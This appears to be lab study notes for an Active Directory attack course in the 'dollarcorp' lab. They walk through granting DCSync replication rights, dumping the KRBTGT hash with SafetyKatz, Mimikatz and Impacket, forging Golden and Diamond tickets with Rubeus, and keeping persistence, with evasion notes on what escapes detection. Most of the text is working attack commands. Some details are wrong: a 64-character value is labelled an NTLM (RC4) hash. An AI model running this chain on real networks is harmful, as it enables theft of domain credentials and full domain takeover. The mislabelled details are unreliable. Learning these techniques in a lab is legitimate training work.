# Learning Objective 12 — DCSync Rights & KRBTGT Hash Extraction

**Date:** 06 August 2026

---

## Objective Overview

1. Check if studentx has Replication (DCSync) rights
2. If yes → Execute DCSync to extract KRBTGT hashes
3. If no → Add replication rights → Execute DCSync

---

## Step 1: Check DCSync Rights for studentx

**Check if studentx has Replication rights on domain:**

```powershell
Get-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -ResolveGUIDs | 
  ?{($_.ObjectAceType -match "Replicating Directory Changes") -and ($_.IdentityReferenceName -match "student")}
```

**Alternative (simpler check):**

```powershell
Get-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -ResolveGUIDs | 
  ?{$_.IdentityReferenceName -match "studentx"}
```

**Output:**
- **If found:** studentx already has Replication rights → Skip to Step 3
- **If not found:** Need to add rights → Continue to Step 2

---

## Step 2: Add DCSync Rights (If Needed)

**Grant Replication rights to studentx:**

```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' 
  -PrincipalIdentity studentx 
  -Rights ExtendedRight 
  -ExtendedRightName "Replicating Directory Changes" 
  -PrincipalDomain dollarcorp.moneycorp.local 
  -TargetDomain dollarcorp.moneycorp.local 
  -Verbose
```

**Alternative (RACE Toolkit):**

```powershell
Set-ADACL -SamAccountName studentx 
  -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local'
  -Right ExtendedRight 
  -ExtendedRightName "Replicating Directory Changes" 
  -Verbose
```

**Verify addition:**

```powershell
Get-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -ResolveGUIDs | 
  ?{($_.ObjectAceType -match "Replicating Directory Changes") -and ($_.IdentityReferenceName -match "studentx")}
```

Should now show studentx with Replication rights.

---

## Step 3: Execute DCSync Attack

**Extract KRBTGT hash using DCSync:**

```powershell
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

**Alternative (Invoke-Mimikatz):**

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

**Alternative (Impacket - from Linux):**

```bash
python3 secretsdump.py -just-dc -no-pass DOLLARCORP.LOCAL/studentx@dcorp-dc.dollarcorp.moneycorp.local
```

---

## Step 4: Capture Output

**Expected output format:**

```
[*] Dumping remote SAM
[*] Getting bootkey... OK
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a102ad5753f4c441e3af31c97fad86fd:::
...
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848:::
```

**Extract KRBTGT hash:**
- NTLM hash (RC4): `154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848`
- AES256 key: Use if available for evasion

---

## Attack Flow

```
1. Check studentx DCSync rights
   ↓
   ├─ YES → Skip to Step 3
   │
   └─ NO → Add Replication rights (Step 2)
          ↓
2. Verify rights added
   ↓
3. Execute DCSync
   ↓
4. Extract KRBTGT hash
   ↓
5. Use hash for:
   - Golden Ticket creation
   - Diamond Ticket creation
   - Forging any user ticket
```

---

## Key Commands Summary

| Task | Command |
|---|---|
| Check DCSync rights | `Get-DomainObjectAcl -TargetIdentity 'DC=...' -ResolveGUIDs \| ?{$_.IdentityReferenceName -match "studentx"}` |
| Add DCSync rights | `Add-DomainObjectAcl -TargetIdentity 'DC=...' -Rights ExtendedRight -ExtendedRightName "Replicating Directory Changes"` |
| Execute DCSync | `SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt"` |
| Extract AES256 key | Add `/user:dcorp\krbtgt /domain:dollarcorp.moneycorp.local` for more details |

---

## DCSync Requirements

**To successfully run DCSync:**

✅ User has "Replicating Directory Changes" right on domain  
✅ User has "Replicating Directory Changes All" (for extended rights)  
✅ Network access to Domain Controller  
✅ Can be non-admin (if ACL grants right)  

---

## Why DCSync is Powerful

✅ **Extract any user hash** — KRBTGT, DA, service accounts  
✅ **No privilege escalation needed** — if ACL is set  
✅ **Silent** — LDAP traffic (harder to detect than process injection)  
✅ **Permanent** — hash doesn't expire  
✅ **No code execution on DC** — doesn't require admin access  

---

## Detection

**What to monitor:**
- Replication-related event IDs (4662, 4624)
- DCSync-like LDAP queries
- Non-DC accounts requesting replication rights
- Unusual ACL modifications on domain root

**What won't detect:**
- MDI (if encryption is used)
- Basic SIEM (if not looking for LDAP patterns)
- Network monitoring (LDAP traffic is normal)

---

## Post-DCSync: Use KRBTGT Hash

**Create Golden Ticket:**

```powershell
Rubeus.exe golden 
  /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
  /user:Administrator 
  /domain:dollarcorp.moneycorp.local 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /ptt
```

**Create Diamond Ticket:**

```powershell
Rubeus.exe diamond 
  /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
  /tgtdeleg 
  /enctype:aes 
  /ticketuser:administrator 
  /domain:dollarcorp.moneycorp.local 
  /ptt
```

---

## Persistence via DCSync Rights

**Why add DCSync rights?**

- **Persistent** — survives password changes
- **Silent** — no privilege escalation
- **Repeatable** — extract hashes anytime
- **Flexible** — extract any user

**Long-term strategy:**
1. Add DCSync rights to student account
2. Downgrade from DA
3. Use student account to extract hashes later
4. Create tickets for access

---

## Troubleshooting

**DCSync fails with "Access Denied":**
- User doesn't have Replication rights
- Needs "Replicating Directory Changes" ExtendedRight
- Add rights using Step 2 commands

**Wrong domain specified:**
- Ensure `/user:domain\username` format
- Verify domain is correct (FQDN)

**No output from DCSync:**
- User may need both "Replicating Directory Changes" and "Replicating Directory Changes All"
- Try broader rights

---

## References

- [SafetyKatz](https://github.com/GhostPack/SafetyKatz)
- [Impacket secretsdump](https://github.com/fortra/impacket)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [DCSync Attack (Harmj0y)](https://blog.harmj0y.net/redteaming/the-adminsdholder-trick/)

---

*Next: Learning Objective 13 — Cross-Forest Attacks*
